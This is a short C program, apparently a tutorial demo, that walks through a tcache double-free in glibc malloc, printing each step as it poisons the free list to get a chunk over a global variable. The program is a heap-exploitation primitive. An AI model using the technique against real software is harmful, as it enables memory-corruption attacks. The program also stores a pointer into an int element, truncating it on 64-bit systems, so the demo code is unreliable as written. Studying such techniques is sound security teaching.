#include <stdio.h>
#include <stdlib.h>

int *arbitrary_pointer = NULL;

int main()
{
	int *our_pointer = NULL;

	fprintf(stderr, "This file demonstrates a simple double-free attack with tcache.\n\n");
	fprintf(stderr, "We want a chunk on top of the global variable arbitrary_pointer at %p\n\n", &arbitrary_pointer);

	fprintf(stderr, "Allocating buffer.\n");
	int *a = malloc(8);

	fprintf(stderr, "malloc(8): %p\n", a);
	fprintf(stderr, "Freeing twice...\n");
	free(a);
	free(a);

	fprintf(stderr, "Now the free list has [ %p, %p ].\n\n", a, a);
	
	fprintf(stderr, "Next we allocate one of the chunks\n\n");
	a = malloc(8);

	fprintf(stderr, "Now the free list has [ %p ].\n", a);
	fprintf(stderr, "Now we overwrite a's fd pointer to the address of arbitrary_pointer\n");
	a[0] = (unsigned long long) &arbitrary_pointer;

	fprintf(stderr, "And now, the free list has [ %p %p ].\n\n", a, &arbitrary_pointer);
	fprintf(stderr, "Two more mallocs, and the second malloc gives us a chunk right on top of arbitrary_pointer\n");

	malloc(8);
	our_pointer = malloc(8);

	fprintf(stderr, "arbitrary_pointer: %p, our_pointer: %p\n", &arbitrary_pointer, our_pointer);

	return 0;
}
